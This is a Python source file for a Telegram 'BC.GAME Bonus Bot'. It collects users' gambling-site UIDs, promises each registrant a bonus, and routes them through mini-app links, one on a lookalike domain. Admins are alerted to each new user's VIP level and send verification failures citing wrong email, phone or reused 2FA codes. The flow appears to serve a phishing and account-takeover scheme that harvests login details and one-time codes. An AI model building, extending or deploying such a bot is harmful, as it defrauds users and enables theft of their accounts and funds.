"""
BC.GAME Bonus Bot - Main File
Complete workflow with verification system
"""
import logging
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    filters,
    ContextTypes
)
from telegram.constants import ParseMode
import json

from config import BOT_TOKEN, WEBAPP_URL, CLAIM_WEBAPP_URL, VERIFICATION_URL, MIN_LEVEL_FOR_BONUS, ADMIN_IDS, START_IMAGE_URL, DONE_BANNER_URL
from database import Database
from api import fetch_bcgame_user, fetch_profile_image, format_money, format_number
from admin import (
    admin_panel,
    handle_admin_callback,
    handle_broadcast_message,
    is_admin
)

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Conversation states
WAITING_UID = 1
WAITING_BROADCAST = 2
WAITING_SEND_USER_ID = 3
WAITING_SEND_CONTENT = 4

async def track_message(telegram_id: int, message):
    """Persist bot message IDs for optional cleanup flows."""
    if not message:
        return
    try:
        await Database.record_bot_message(telegram_id, message.message_id)
    except Exception as e:
        logger.error(f"Failed to track message {getattr(message, 'message_id', None)}: {e}")

def get_claim_url(user_data: dict, bc_uid: str, default_url: str = None) -> str:
    """Return the right claim URL for normal and marked-done users."""
    if int((user_data or {}).get('marked_done') or 0):
        return DONE_BANNER_URL
    return default_url or f"https://bcgame67.com/?uid={bc_uid}"

def claim_button(label: str, url: str) -> InlineKeyboardButton:
    """Use Telegram mini-app buttons for claim/profile/banner links."""
    return InlineKeyboardButton(label, web_app=WebAppInfo(url=url))

# ==================== USER HANDLERS ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command with welcome image"""
    user = update.effective_user
    
    # Check if user already exists
    existing_user = await Database.get_user_by_telegram_id(user.id)
    
    if existing_user:
        # User already registered - show profile with claim button
        await show_existing_user_profile(update, context, existing_user)
    else:
        # New user - show welcome image and ask for UID
        caption = "<b>Enter your BC.GAME UID to proceed.</b>"
        
        try:
            msg = await update.message.reply_photo(
                photo="https://raw.githubusercontent.com/BcGameTop/Imagess/refs/heads/main/uidguide.png",
                caption=caption,
                parse_mode=ParseMode.HTML
            )
            await track_message(update.effective_user.id, msg)
        except Exception as e:
            logger.error(f"Failed to send start image: {e}")
            # Fallback to text message
            msg = await update.message.reply_text(caption, parse_mode=ParseMode.HTML)
            await track_message(update.effective_user.id, msg)
        
        return WAITING_UID

async def show_existing_user_profile(update: Update, context: ContextTypes.DEFAULT_TYPE, user_data: dict):
    """Show smaller profile for existing users"""
    bc_uid = user_data.get('bc_uid')
    username = user_data.get('username', 'User')
    level = user_data.get('level', 0)
    level_name = user_data.get('level_name', f'VIP {level}')
    verified = user_data.get('verified', 0)
    verification_status = user_data.get('verification_status', '')
    
    text = (
        f"Welcome back, <b>{username}</b>!\n\n"
        f"UID: <code>{bc_uid}</code>\n"
        f"Level: <b>{level_name}</b>\n"
    )
    
    keyboard = []
    
    if verified:
        text += "Status: <b>Verified</b>\n"
    else:
        if verification_status:
            text += f"Status: <b>{verification_status}</b>\n"
        else:
            text += "Status: <b>Not Verified</b>\n"

    claim_url = get_claim_url(user_data, bc_uid)
    keyboard.append([claim_button("Claim Bonus", claim_url)])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    msg = await update.message.reply_text(text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
    await track_message(update.effective_user.id, msg)

async def receive_uid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle UID input - show profile after registration"""
    uid = update.message.text.strip()
    user = update.effective_user
    
    # Validate UID (basic check)
    if not uid.isdigit():
        msg = await update.message.reply_text(
            "âŒ Invalid UID format. Please enter a valid numeric UID."
        )
        await track_message(update.effective_user.id, msg)
        return WAITING_UID
    
    # Delete user's message
    try:
        await update.message.delete()
    except:
        pass
    
    # Show loading message with animation
    loading_msg = await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text="Processing..."
    )
    await track_message(update.effective_user.id, loading_msg)
    
    # Animate dots
    for i in range(3):
        await asyncio.sleep(0.5)
        try:
            await loading_msg.edit_text(f"Processing{'.' * (i + 1)}")
        except:
            pass
    
    try:
        # Fetch user data from BC.GAME API
        bc_data = await fetch_bcgame_user(uid)
        
        if not bc_data:
            await loading_msg.edit_text(
                "âŒ <b>Profile Not Found</b>\n\n"
                "Unable to find a BC.GAME account with this UID.\n"
                "Please check your UID and try again.\n\n"
                "Use /start to try again.",
                parse_mode=ParseMode.HTML
            )
            return ConversationHandler.END
        
        # Save user to database
        success = await Database.save_user(
            telegram_id=user.id,
            bc_uid=uid,
            bc_data=bc_data,
            username=user.username or user.first_name
        )
        
        if not success:
            await loading_msg.edit_text(
                "âŒ <b>Database Error</b>\n\n"
                "Failed to save your profile. Please try again later.\n\n"
                "Use /start to try again.",
                parse_mode=ParseMode.HTML
            )
            return ConversationHandler.END
        
        # Delete loading message
        await loading_msg.delete()
        
        # Notify admin about new registration
        bc_username = bc_data.get('name', 'User')
        level = bc_data.get('level', 0)
        level_name = bc_data.get('levelName', f'VIP {level}')
        
        admin_notification = (
            f"<b>New User Registration</b>\n\n"
            f"Telegram: {user.mention_html()}\n"
            f"Username: @{user.username or 'N/A'}\n"
            f"BC.GAME: <b>{bc_username}</b>\n"
            f"UID: <code>{uid}</code>\n"
            f"Level: <b>{level_name}</b>"
        )
        
        for admin_id in ADMIN_IDS:
            try:
                await context.bot.send_message(
                    chat_id=admin_id,
                    text=admin_notification,
                    parse_mode=ParseMode.HTML
                )
            except Exception as e:
                logger.error(f"Failed to notify admin {admin_id}: {e}")
        
        # Send user their profile with claim button
        profile_photo_url = await fetch_profile_image(uid)
        
        caption = (
            f"<b>{bc_username}</b>\n"
            f"<b>{level_name}</b>\n\n"
            f"Congratulations! You are eligible for bonus.\n"
            f"Click the Claim button below to claim."
        )
        
        keyboard = [
            [claim_button("Claim My Bonus", get_claim_url({}, uid))]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        try:
            if profile_photo_url:
                msg = await context.bot.send_photo(
                    chat_id=update.effective_chat.id,
                    photo=profile_photo_url,
                    caption=caption,
                    reply_markup=reply_markup,
                    parse_mode=ParseMode.HTML
                )
                await track_message(update.effective_user.id, msg)
            else:
                msg = await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=caption,
                    reply_markup=reply_markup,
                    parse_mode=ParseMode.HTML
                )
                await track_message(update.effective_user.id, msg)
        except Exception as e:
            logger.error(f"Error sending profile: {e}")
            msg = await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=caption,
                reply_markup=reply_markup,
                parse_mode=ParseMode.HTML
            )
            await track_message(update.effective_user.id, msg)
        
        return ConversationHandler.END
        
    except Exception as e:
        logger.error(f"Error processing UID {uid}: {e}")
        await loading_msg.edit_text(
            "âŒ <b>Error</b>\n\n"
            "An error occurred while processing your request.\n"
            "Please try again later.\n\n"
            "Use /start to try again.",
            parse_mode=ParseMode.HTML
        )
        return ConversationHandler.END

async def profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /profile command"""
    user = update.effective_user
    user_data = await Database.get_user_by_telegram_id(user.id)
    
    if not user_data:
        msg = await update.message.reply_text(
            "âŒ You haven't registered yet.\n\n"
            "Use /start to register your BC.GAME account."
        )
        await track_message(update.effective_user.id, msg)
        return
    
    bc_uid = user_data.get('bc_uid')
    username = user_data.get('username', 'User')
    level = user_data.get('level', 0)
    level_name = user_data.get('level_name', 'VIP 0')
    wagered = user_data.get('wagered', 0)
    wins = user_data.get('wins', 0)
    bets = user_data.get('bets', 0)
    eligible = user_data.get('eligible_for_bonus', 0)
    
    text = (
        f"<b>Your Profile</b>\n\n"
        f"Username: <b>{username}</b>\n"
        f"BC.GAME UID: <code>{bc_uid}</code>\n"
        f"Level: <b>{level_name or f'VIP {level}'}</b>\n"
        f"Wagered: <b>{format_money(wagered)}</b>\n"
        f"Wins: <b>{format_number(wins)}</b> / {format_number(bets)} bets\n"
    )
    
    if eligible:
        text += "\nEligible for bonus!"
        claim_url = get_claim_url(user_data, bc_uid, f"{WEBAPP_URL}?uid={bc_uid}")
        keyboard = [
            [claim_button("View Full Profile & Claim Bonus", claim_url)],
            [InlineKeyboardButton("Update", callback_data="update_profile")]
        ]
    else:
        text += f"\nNeed level {MIN_LEVEL_FOR_BONUS} for bonus"
        keyboard = [
            [InlineKeyboardButton("Update Profile", callback_data="update_profile")]
        ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    msg = await update.message.reply_text(text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
    await track_message(update.effective_user.id, msg)

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle callback queries"""
    query = update.callback_query
    await query.answer()
    
    if query.data == "update_profile":
        await update_profile_callback(query, context)
    elif query.data.startswith("verify_error_"):
        # Admin verification error handling
        await handle_verification_error(query, context)
    elif query.data.startswith("verify_user_"):
        # Admin verification approval
        await handle_admin_verification(query, context)

async def handle_verification_error(query, context):
    """Handle admin verification error selection"""
    error_type = query.data.replace("verify_error_", "")
    
    # Get the user_id from context (set by admin command)
    if 'pending_verification_user' not in context.user_data:
        await query.message.edit_text("âŒ Session expired. Please use admin menu again.")
        return
    
    target_user_id = context.user_data['pending_verification_user']
    
    error_messages = {
        "email": "âŒ Verification Failed: Incorrect email provided",
        "phone": "âŒ Verification Failed: Incorrect phone number",
        "2fa": "âŒ Verification Failed: 2FA verification issue",
        "2fa_reuse": "âŒ Verification Failed: 2FA code already used or expired"
    }
    
    message = error_messages.get(error_type, "âŒ Verification Failed")
    
    # Update user verification status
    await Database.update_verification_status(target_user_id, 0, message)
    
    # Send message to user
    try:
        msg = await context.bot.send_message(
            chat_id=target_user_id,
            text=f"{message}\n\nPlease try verification again with correct information.",
            parse_mode=ParseMode.HTML
        )
        await track_message(target_user_id, msg)
        await query.message.edit_text(f"âœ… Error message sent to user {target_user_id}")
    except Exception as e:
        await query.message.edit_text(f"âŒ Failed to send message: {e}")

async def handle_admin_verification(query, context):
    """Handle admin verification approval"""
    user_id = int(query.data.replace("verify_user_", ""))
    
    # Update user verification status
    await Database.update_verification_status(user_id, 1, "Verified")
    
    # Get user data
    user_data = await Database.get_user_by_telegram_id(user_id)
    
    if not user_data:
        await query.message.edit_text("âŒ User not found")
        return
    
    bc_uid = user_data.get('bc_uid')
    username = user_data.get('username', 'User')
    bonus_text = user_data.get('bonus_text', '')
    
    logger.info(f"Verification approved for user {user_id}: bonus_text='{bonus_text}'")
    
    # Build WebApp URL with bonus text if available
    webapp_url = get_claim_url(user_data, bc_uid, f"{WEBAPP_URL}?uid={bc_uid}")
    if bonus_text and webapp_url != DONE_BANNER_URL:
        from urllib.parse import quote
        webapp_url += f"&bonus_text={quote(bonus_text)}"
    
    # Send verification success to user
    try:
        # Build message with bonus text if available
        message_text = f"<b>Verification Approved!</b>\n\n"
        
        if bonus_text:
            message_text += f"<b>Your Bonus:</b>\n{bonus_text}\n\n"
        
        message_text += "You can now claim your bonuses."
        
        keyboard = [
            [claim_button("Open Profile & Claim Bonus", webapp_url)]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        msg = await context.bot.send_message(
            chat_id=user_id,
            text=message_text,
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup
        )
        await track_message(user_id, msg)
        
        success_msg = f"âœ… User {username} ({user_id}) verified successfully"
        if bonus_text:
            success_msg += f"\nBonus text sent: {bonus_text}"
        await query.message.edit_text(success_msg)
    except Exception as e:
        await query.message.edit_text(f"âœ… Verified, but failed to notify user: {e}")

async def update_profile_callback(query, context):
    """Handle update profile request"""
    user = query.from_user
    user_data = await Database.get_user_by_telegram_id(user.id)
    
    if not user_data:
        await query.message.edit_text("âŒ Profile not found. Use /start to register.")
        return
    
    bc_uid = user_data.get('bc_uid')
    
    await query.message.edit_text("â³ Updating your profile...\nPlease wait.")
    
    # Fetch fresh data
    bc_data = await fetch_bcgame_user(bc_uid)
    
    if not bc_data:
        await query.message.edit_text(
            "âŒ Failed to update profile.\n\n"
            "Use /profile to try again."
        )
        return
    
    # Update database
    await Database.save_user(
        telegram_id=user.id,
        bc_uid=bc_uid,
        bc_data=bc_data,
        username=user.username or user.first_name
    )
    
    level = bc_data.get('level', 0)
    level_name = bc_data.get('levelName', 'VIP 0')
    wagered = float(bc_data.get('betAmountUsd', 0))
    
    text = (
        f"<b>Profile Updated!</b>\n\n"
        f"Level: <b>{level_name or f'VIP {level}'}</b>\n"
        f"Wagered: <b>{format_money(wagered)}</b>"
    )
    
    if level >= MIN_LEVEL_FOR_BONUS:
        text += "\n\nYou are eligible for bonus!"
        claim_url = get_claim_url(user_data, bc_uid, f"{WEBAPP_URL}?uid={bc_uid}")
        keyboard = [
            [claim_button("View Profile & Claim Bonus", claim_url)]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
    else:
        text += f"\n\nNeed level {MIN_LEVEL_FOR_BONUS} for bonus"
        reply_markup = None
    
    await query.message.edit_text(text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /help command"""
    text = (
        "<b>BC.GAME Bonus Bot</b>\n\n"
        "<b>Available Commands:</b>\n\n"
        "/start - Register or view your profile\n"
        "/profile - View your profile details\n"
        "/help - Show this help message\n\n"
    )
    
    if is_admin(update.effective_user.id):
        text += (
            "<b>Admin Commands:</b>\n"
            "/admin - Open admin panel\n\n"
        )
    
    text += (
        "<b>How it works:</b>\n"
        "1. Register with your BC.GAME UID\n"
        "2. We fetch your profile data\n"
        f"3. If you're level {MIN_LEVEL_FOR_BONUS}+, claim bonuses!\n\n"
        "Need help? Contact support."
    )
    
    msg = await update.message.reply_text(text, parse_mode=ParseMode.HTML)
    await track_message(update.effective_user.id, msg)

async def handle_webapp_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle data sent from Telegram WebApp"""
    if not update.message or not update.message.web_app_data:
        logger.warning("WebApp data handler called without web_app_data.")
        return

    data = update.message.web_app_data.data
    logger.info("WebApp data received: %s", data)
    try:
        payload = json.loads(data)
    except Exception:
        payload = {"action": data}

    if payload.get("action") == "claim_bonus":
        user = update.effective_user
        user_data = await Database.get_user_by_telegram_id(user.id)
        if not user_data:
            msg = await update.message.reply_text("âŒ Profile not found. Use /start to register.")
            await track_message(update.effective_user.id, msg)
            return

        bc_uid = user_data.get("bc_uid")
        if not bc_uid:
            msg = await update.message.reply_text("âŒ Missing BC.GAME UID. Use /start to register.")
            await track_message(update.effective_user.id, msg)
            return

        claim_url = get_claim_url(user_data, bc_uid, CLAIM_WEBAPP_URL)
        keyboard = [
            [claim_button("âœ… Claim Bonus", claim_url)]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        msg = await update.message.reply_text(
            "Tap the button below to proceed with your bonus claim.",
            reply_markup=reply_markup
        )
        await track_message(update.effective_user.id, msg)
    else:
        msg = await update.message.reply_text("Received request from WebApp.")
        await track_message(update.effective_user.id, msg)

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel conversation"""
    msg = await update.message.reply_text(
        "âŒ Cancelled.\n\n"
        "Use /start to begin again."
    )
    await track_message(update.effective_user.id, msg)
    return ConversationHandler.END

# ==================== MAIN ====================

async def initialize_database():
    """Initialize database"""
    from config import DATABASE_PATH
    await Database.init(DATABASE_PATH)

async def start_web_admin(application):
    """Start the local web admin panel alongside the bot."""
    try:
        from admin_web import start_admin_web
        from config import ADMIN_PANEL_PUBLIC_URL

        runner = await start_admin_web(bot=application.bot)
        application.bot_data['admin_web_runner'] = runner
        logger.info(f"Admin web panel started: {ADMIN_PANEL_PUBLIC_URL}")
    except Exception as e:
        logger.error(f"Failed to start admin web panel: {e}")

async def stop_web_admin(application):
    """Stop the local web admin panel during bot shutdown."""
    runner = application.bot_data.get('admin_web_runner')
    if not runner:
        return
    try:
        from admin_web import stop_admin_web
        await stop_admin_web(runner)
    except Exception as e:
        logger.error(f"Failed to stop admin web panel: {e}")

def main():
    """Start the bot"""
    import asyncio
    from config import DATABASE_PATH
    
    # Initialize database first  
    asyncio.run(initialize_database())
    
    # Create new event loop for the bot (Python 3.11+ closes loop after asyncio.run)
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    # Create application
    application = (
        Application.builder()
        .token(BOT_TOKEN)
        .post_init(start_web_admin)
        .post_shutdown(stop_web_admin)
        .build()
    )
    
    # Conversation handler for UID registration
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            WAITING_UID: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_uid)]
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )
    
    # Add handlers
    application.add_handler(conv_handler)
    application.add_handler(CommandHandler('profile', profile))
    application.add_handler(CommandHandler('help', help_command))
    application.add_handler(CommandHandler('admin', admin_panel))
    application.add_handler(CallbackQueryHandler(handle_admin_callback, pattern="^admin_"))
    application.add_handler(CallbackQueryHandler(handle_callback))
    application.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, handle_webapp_data))
    
    # Broadcast message handler (for admins)
    application.add_handler(
        MessageHandler(
            filters.User(user_id=ADMIN_IDS) & ~filters.COMMAND,
            handle_broadcast_message
        )
    )
    
    # Start bot
    logger.info("Bot starting...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
